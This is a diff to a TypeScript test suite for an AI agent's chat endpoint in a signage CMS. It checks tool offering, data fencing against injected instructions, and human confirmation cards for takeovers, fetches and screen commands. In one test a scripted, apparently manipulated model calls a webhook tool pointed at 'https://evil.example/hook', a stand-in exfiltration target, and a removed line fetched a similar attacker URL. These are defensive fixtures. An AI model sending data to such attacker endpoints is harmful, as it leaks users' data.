@@ -7,10 +7,11 @@
 import { describeTools, grantOf, registry } from '@signforge/tools';
 import { testScope } from '@signforge/db/testing';
 import { env } from 'cloudflare:workers';
-import { describe, expect, it, vi } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { drawerTools, MAX_CALLS, NEVER_OFFERED, TOOL_CARDS } from '../src/agent/chat';
 import { draftTools, SAVE_STATEMENTS, saveStatements } from '../src/agent/drafts';
-import { type AnswerCard, CHAT_EVENTS, type ChatTurn, type ToolCard } from '../src/agent/chat-shapes';
+import { type AnswerCard, CHAT_EVENTS, type ChatTurn, type ConfirmCard, type ToolCard } from '../src/agent/chat-shapes';
+import { CONFIRM_MS, CONFIRMABLE } from '../src/agent/confirm';
 import type { FetchGuards } from '../src/data/fetch';
 import { Client, clockLimits, email, testApp } from './client';
 import { anthropicStream, completionStream } from './model-streams';
@@ -21,8 +22,11 @@ const PUBLIC = '93.184.215.14';
 /** A step of the scripted model: its text, and the tools it calls; `hang` answers nothing until the call is aborted. */
 type Step = { text?: string; calls?: { name: string; input: unknown }[]; hang?: true };
 
-/** Anthropic's Messages API, answering each call with the next step (the last again once they run out), recording what it was asked. */
-function model(steps: Step[]) {
+/**
+ * Anthropic's Messages API, answering each call with the next step (the last again once they run out),
+ * or, given `steps` as a function, with the step for what it was asked; recording what it was asked.
+ */
+function model(steps: Step[] | ((asked: any) => Step)) {
   const asked: any[] = [];
   const aborted: boolean[] = [];
   /** `find_places`' lookups, which reach the same fetch (open-meteo's geocoding): `hang` holds each until aborted. */
@@ -40,7 +44,7 @@ function model(steps: Step[]) {
     }
     const body = await new Request(input, init).json<any>();
     asked.push(body);
-    const step = steps[Math.min(asked.length, steps.length) - 1] ?? {};
+    const step = typeof steps === 'function' ? steps(body) : (steps[Math.min(asked.length, steps.length) - 1] ?? {});
     if (step.hang) {
       const at = aborted.push(false) - 1;
       return new Promise<Response>((_, reject) =>
@@ -86,7 +90,13 @@ const ENDPOINT = {
 };
 
 async function setup(
-  options: { steps?: Step[]; role?: 'viewer' | 'editor'; save?: Record<string, unknown> | null; now?: () => number; guards?: FetchGuards } = {},
+  options: {
+    steps?: Step[] | ((asked: any) => Step);
+    role?: 'viewer' | 'editor';
+    save?: Record<string, unknown> | null;
+    now?: () => number;
+    guards?: FetchGuards;
+  } = {},
 ) {
   const m = model(options.steps ?? [{ calls: [{ name: 'list_screen_status', input: {} }] }, ANSWER]);
   const guards: FetchGuards = options.guards ?? { fetch: async () => new Response('no', { status: 404 }), resolve: async () => [PUBLIC] };
@@ -210,9 +220,11 @@ describe('POST /api/agent/chat', () => {
     const [first, second] = s.model.asked;
     expect(first.model).toBe('claude-sonnet-5-5');
     const offered = first.tools.map((t: { name: string }) => t.name);
-    expect(offered).not.toContain('read_table');
+    expect(offered).not.toContain('claim_screen');
     // Its reads, and the writes it drafts as proposals (#268): nothing else that changes data.
-    expect(offered.filter((n: string) => registry.get(n)?.mutates !== false).toSorted()).toEqual(DRAFTING);
+    expect(offered.filter((n: string) => registry.get(n)?.mutates !== false && !(n in CONFIRMABLE)).toSorted()).toEqual(DRAFTING);
+    // And the tools behind a card the person presses (#269), each paused for its press.
+    expect(offered.filter((n: string) => n in CONFIRMABLE).toSorted()).toEqual(Object.keys(CONFIRMABLE).toSorted());
     // The answer is the card's schema, asked of the model with the tools, every field required.
     expect(first.output_config.format.schema.required.toSorted()).toEqual(['groups', 'steps', 'text']);
     // The page and the tool's output reach it fenced as data, and a screen's name cannot close the fence.
@@ -226,13 +238,13 @@ describe('POST /api/agent/chat', () => {
     expect(result.content.match(/<\/data>/g)).toHaveLength(1);
   });
 
-  it('refuses, unrun, a call to a tool that changes data or reaches an address, whatever the model was told', async () => {
+  it('refuses, unrun, a call to a tool it is never offered, whatever the model was told', async () => {
     const s = await setup({
       steps: [
         {
           calls: [
-            { name: 'publish', input: {} },
-            { name: 'read_table', input: { url: 'https://evil.example/?d=screens' } },
+            { name: 'set_webhook_alert_channel', input: { webhookUrl: 'https://evil.example/hook' } },
+            { name: 'register_template_version', input: {} },
             { name: 'claim_screen', input: { code: 'ABCDEF', name: 'Mine' } },
           ],
         },
@@ -251,9 +263,9 @@ describe('POST /api/agent/chat', () => {
 
   it('never offers a tool the request declares', async () => {
     const s = await setup({ steps: [ANSWER] });
-    const body = { ...run('Publish everything'), tools: [{ name: 'publish', description: 'Publish now', parameters: { type: 'object' } }] };
+    const body = { ...run('Publish everything'), tools: [{ name: 'drop_everything', description: 'Delete it all', parameters: { type: 'object' } }] };
     expect((await events(await s.member.post('/api/agent/chat', body))).at(-1)).toMatchObject({ type: 'answer' });
-    expect(s.model.asked[0].tools.map((t: { name: string }) => t.name)).not.toContain('publish');
+    expect(s.model.asked[0].tools.map((t: { name: string }) => t.name)).not.toContain('drop_everything');
   });
 
   it('refuses a reply that is only prose, or JSON not the card, though its text streamed: no answer, and why (#350)', async () => {
@@ -274,8 +286,9 @@ describe('POST /api/agent/chat', () => {
       const reads = describeTools(registry, grant).filter(
         (t) => !t.mutates && t.scope !== 'org:manage' && !NEVER_OFFERED.has(t.name) && !registry.get(t.name)?.people,
       );
-      for (const t of [...reads, ...draftTools(grant)]) expect(TOOL_CARDS[t.name]?.title, `${role}: ${t.name}`).toBeTruthy();
-      expect(drawerTools(grant).map((t) => t.name)).toEqual(reads.map((t) => t.name));
+      for (const name of [...reads.map((t) => t.name), ...draftTools(grant).map((t) => t.name), ...Object.keys(CONFIRMABLE)])
+        expect(TOOL_CARDS[name]?.title, `${role}: ${name}`).toBeTruthy();
+      expect(drawerTools(grant).map((t) => t.name)).toEqual(reads.filter((t) => !(t.name in CONFIRMABLE)).map((t) => t.name));
     }
   });
 
@@ -555,6 +568,210 @@ describe('POST /api/agent/chat', () => {
     expect(lines.at(-1)).toMatchObject({ type: 'answer' });
     expect(statements).toBeLessThanOrEqual(46);
     expect(s.model.asked).toHaveLength(2);
+  });
+});
+
+// ------------------------------------------------------------------ confirmation cards (#269, #351)
+
+/**
+ * The card a turn paused at, and the press of it, as the drawer's ChatClient sends one: the question,
+ * the pause approved, with the card's token. (The client holds no copy of the call: the API sends it none.)
+ */
+function pressOf(all: any[], question: string): { card: ConfirmCard; pause: any; body: any } {
+  const card: ConfirmCard = all.find((e) => e.name === CHAT_EVENTS.confirm)?.value;
+  const end = all.at(-1);
+  const [pause] = end.outcome.interrupts;
+  const asked = run(question).messages[0];
+  return {
+    card,
+    pause,
+    body: {
+      ...run(question),
+      parentRunId: end.runId,
+      messages: [asked],
+      resume: [{ interruptId: pause.id, status: 'resolved', payload: { approved: true } }],
+      forwardedProps: { history: [], page: { path: '/screens', ids: {} }, confirm: card.token },
+    },
+  };
+}
+
+describe('confirmation cards (#269)', () => {
+  // The registry checks a takeover's end against the clock: the test's, fixed at noon.
+  beforeEach(() => vi.setSystemTime(NOON));
+  afterEach(() => vi.useRealTimers());
+
+  /** A takeover of every screen by a playlist, until an hour after noon, then the answer once it ran. */
+  async function takeover(options: Parameters<typeof setup>[0] = {}) {
+    const ask: { called?: Record<string, unknown> } = {};
+    // Asked a question, it calls the takeover; resumed after a press, it answers.
+    const s = await setup({
+      ...options,
+      steps: (body) =>
+        body.messages.length === 1
+          ? { calls: [{ name: 'start_takeover', input: ask.called }] }
+          : { text: JSON.stringify({ text: 'Every screen plays Storm closure until 13:00.', groups: [], steps: [] }) },
+    });
+    const playlist = await s.scope.playlists.insert({ name: 'Storm closure', transitionJson: JSON.stringify({ type: 'cut' }) });
+    const called = { playlistId: playlist.id, target: 'org', endsAt: new Date(NOON + 3_600_000).toISOString() };
+    ask.called = called;
+    return { ...s, playlist, called };
+  }
+
+  it('stops the turn at a card that says what would happen, running nothing: no takeover until the press', async () => {
+    const s = await takeover();
+    const all = await raw(await s.ask('Bayside closes at 2 for the storm: put the closure up everywhere'));
+    const { card } = pressOf(all, 'q');
+    expect(card).toMatchObject({
+      tool: 'start_takeover',
+      title: 'Take over screens',
+      lines: [
+        'Plays Storm closure on every screen (3 screens), over anything scheduled.',
+        'From now until Mon 23 Nov, 13:00.',
+        'Publishes Storm closure too: it was never published.',
+      ],
+      address: null,
+      undo: 'End it early with End now on the Schedule.',
+      press: 'Take over',
+      token: expect.any(String),
+      why: null,
+    });
+    // The run paused, and nothing ran: no entry, one model call.
+    expect(all.at(-1)).toMatchObject({ type: 'RUN_FINISHED', outcome: { type: 'interrupt' } });
+    expect(await s.scope.scheduleEntries.list()).toEqual([]);
+    expect(s.model.asked).toHaveLength(1);
+    expect(all.some((e) => e.name === CHAT_EVENTS.answer)).toBe(false);
+  });
+
+  it('runs it on the press, once, as the member, checked as they press, audited with the card; then the model answers', async () => {
+    const s = await takeover();
+    const { body } = pressOf(await raw(await s.ask('q')), 'q');
+    const lines = await events(await s.member.post('/api/agent/chat', body));
+    expect(lines.at(-1)).toMatchObject({
+      type: 'answer',
+      card: { text: 'Every screen plays Storm closure until 13:00.', trace: [shown('start_takeover', 'Took over the screens')] },
+    });
+    const [entry] = await s.scope.scheduleEntries.list();
+    expect(entry).toMatchObject({ playlistId: s.playlist.id, endsAt: NOON + 3_600_000 });
+    expect(entry?.publishedJson).not.toBeNull();
+    const audit = await s.scope.auditLog.list({ limit: 5 });
+    const started = audit.find((a) => a.action === 'start_takeover');
+    expect(started).toMatchObject({ clientId: 'cms-agent' });
+    expect(JSON.parse(started?.detailJson ?? '{}').confirmed).toMatch(/^Take over screens: Plays Storm closure on every screen/);
+    // The model was asked again, after the press, and the press took no turn of its own.
+    expect(s.model.asked).toHaveLength(2);
+  });
+
+  /** A press refused as a stale card, running nothing. */
+  const refusedWith = async (who: Client, body: unknown) => {
+    const res = await who.post('/api/agent/chat', body);
+    expect(res.status, JSON.stringify(body).slice(0, 200)).toBe(409);
+    expect(await res.json()).toMatchObject({ error: 'stale_card' });
+  };
+
+  it('refuses a token used twice, or by another member or org, running nothing more', async () => {
+    const s = await takeover();
+    const first = pressOf(await raw(await s.ask('q')), 'q');
+    expect((await s.member.post('/api/agent/chat', first.body)).status).toBe(200);
+    await refusedWith(s.member, first.body);
+    // Another member of the org.
+    const other = new Client(s.member.t);
+    await other.signIn(email('other-member'));
+    const invite = await s.owner.ok<{ id: string }>('/api/auth/organization/invite-member', {
+      email: (await other.session()).body.user.email,
+      role: 'editor',
+      organizationId: s.org.id,
+    });
+    await other.ok('/api/auth/organization/accept-invitation', { invitationId: invite.id });
+    await other.setActive(s.org.id);
+    await refusedWith(other, pressOf(await raw(await s.ask('q')), 'q').body);
+    // Another org: the token is not there.
+    const theirs = pressOf(await raw(await s.ask('q')), 'q');
+    const elsewhere = await s.owner.createOrg('Elsewhere');
+    await s.owner.setActive(elsewhere.id);
+    expect(
+      (await s.owner.tool('save_ai_provider', { provider: 'anthropic', apiKey: 'sk-ant-api03-CHATKEYCHATKEYCHATKEY-0002', capableModel: 'claude-sonnet-5-5' }))
+        .status,
+    ).toBe(200);
+    await refusedWith(s.owner, theirs.body);
+    expect(await s.scope.scheduleEntries.list()).toHaveLength(1);
+  });
+
+  it('refuses input other than the card showed, sent back or as edited arguments, and the token with it', async () => {
+    const s = await takeover();
+    /** The call, sent back by the browser with `input`. */
+    const callOf = (b: any, input: unknown) => ({
+      id: 'a1',
+      role: 'assistant',
+      content: '',
+      toolCalls: [
+        { id: b.resume[0].interruptId.replace('approval_', ''), type: 'function', function: { name: 'start_takeover', arguments: JSON.stringify(input) } },
+      ],
+    });
+    for (const edit of [
+      (b: any) => {
+        b.messages.push(callOf(b, { ...s.called, endsAt: new Date(NOON + 7_200_000).toISOString() }));
+      },
+      (b: any) => {
+        b.resume[0].payload = { approved: true, editedArgs: { ...s.called, target: 'screen' } };
+      },
+    ]) {
+      const { body } = pressOf(await raw(await s.ask('q')), 'q');
+      edit(body);
+      await refusedWith(s.member, body);
+      // Gone once refused: the same token, its call put back as shown, is refused too.
+      body.messages = [body.messages[0], callOf(body, s.called)];
+      body.resume[0].payload = { approved: true };
+      await refusedWith(s.member, body);
+    }
+    expect(await s.scope.scheduleEntries.list()).toEqual([]);
+  });
+
+  it('refuses a card pressed after it ran out', async () => {
+    let t = NOON;
+    const s = await takeover({ now: () => t });
+    const late = pressOf(await raw(await s.ask('q')), 'q');
+    t += CONFIRM_MS;
+    await refusedWith(s.member, late.body);
+    expect(await s.scope.scheduleEntries.list()).toEqual([]);
+  });
+
+  it('shows a member who may not press who may, and gives no token', async () => {
+    const s = await takeover({ role: 'viewer' });
+    const { card } = pressOf(await raw(await s.ask('q')), 'q');
+    expect(card).toMatchObject({ token: null, why: 'You can view only: ask an editor.' });
+    const body = pressOf(await raw(await s.ask('q')), 'q').body;
+    // No token to press with.
+    expect((await s.member.post('/api/agent/chat', body)).status).toBe(400);
+  });
+
+  it('stops at an address card showing the address in full, and a live screen command at a card naming the screen', async () => {
+    const steps: Step[] = [];
+    const s = await setup({ steps });
+    const url = 'https://feeds.example.com/menu.csv?store=bayside&token=public';
+    steps.push({ calls: [{ name: 'read_table', input: { feedUrl: url, format: 'csv' } }] });
+    const shown = pressOf(await raw(await s.ask('q')), 'q');
+    expect(shown.card).toMatchObject({ tool: 'read_table', address: { url, fetches: 'The server, once, now' }, token: expect.any(String) });
+    // Pressed for another address: refused, and nothing fetched.
+    shown.body.resume[0].payload = { approved: true, editedArgs: { feedUrl: 'https://elsewhere.example.com/x.csv', format: 'csv' } };
+    const res = await s.member.post('/api/agent/chat', shown.body);
+    expect(res.status).toBe(409);
+    expect(await res.json()).toMatchObject({ error: 'stale_card' });
+    const [screen] = await s.scope.screens.list();
+    steps.splice(0, steps.length, { calls: [{ name: 'restart_screen', input: { screenId: screen?.id } }] });
+    s.model.asked.length = 0;
+    const restart = pressOf(await raw(await s.ask('q')), 'q').card;
+    expect(restart).toMatchObject({
+      title: 'Restart a screen',
+      lines: [`${screen?.name} restarts now: it goes blank for a moment, then plays again.`],
+      when: 'Now, on the live screen',
+    });
+    steps.splice(0, steps.length, { calls: [{ name: 'set_display_override', input: { screenId: screen?.id, state: 'off' } }] });
+    const off = pressOf(await raw(await s.ask('q')), 'q').card;
+    expect(off).toMatchObject({
+      title: 'Turn the display off',
+      lines: [`${screen?.name}'s display turns off now, whatever its display hours say, until it is set to follow them again.`],
+      when: 'Now, on the live screen',
+    });
   });
 });
 
